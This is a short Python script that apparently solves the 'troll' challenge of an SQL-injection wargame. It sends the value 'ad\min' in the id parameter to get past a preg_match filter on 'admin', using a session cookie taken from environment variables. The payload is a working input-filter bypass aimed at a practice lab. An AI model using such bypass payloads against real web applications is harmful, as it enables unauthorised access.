import requests
from dotenv import load_dotenv
import os

load_dotenv()
#SyntaxWarning이 일어나나, warning일 뿐이므로 무시하면 된다. 
#preg_match 우회에만 사용가능...
url=os.environ.get('LOS_URL')+'chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=ad\min'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "TROLL Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)